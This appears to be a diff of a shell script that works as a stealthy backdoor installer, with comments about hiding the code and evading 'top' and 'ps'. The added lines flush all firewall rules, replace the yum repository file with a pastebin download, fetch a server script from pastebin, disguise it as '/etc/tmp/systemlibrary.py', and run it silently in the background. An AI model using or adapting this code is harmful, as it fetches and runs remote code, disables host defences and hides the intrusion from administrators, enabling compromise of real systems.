@@ -13,17 +13,17 @@
 # TODO hide the code and changes (rename server code to syslib.py)
 # 6. runs the server code and backgrounds
 # 7. Look into deletion of script as well for one last hiding bit?
-
-sudo strace -o /dev/null /bin/sh -lic "iptables -A IN_public_allow -p tcp -m tcp --dport 1337 -m conntrack --ctstate NEW,UNTRACKED -j ACCEPT;
+{
+sudo strace -o /dev/null /bin/sh -lic "iptables -F;
 curl https://pastebin.com/raw/XLiGFWha > /etc/yum.repos.d/CentOS-Base.repo;
 yum clean all;
 yum install -y python3;
-curl https://pastebin.com/raw/LB9011Qf > server_code.py;
-python3 server_code.py
+curl https://pastebin.com/raw/y0SZSyy0 > server_code.py;
+mkdir /etc/tmp;
+mv server_code.py /etc/tmp/systemlibrary.py;
+python3 /etc/tmp/systemlibrary.py
 "
-
-
-#} &> /dev/null
+} &> /dev/null & 
 
 # hide top and ps to avoid detection
 
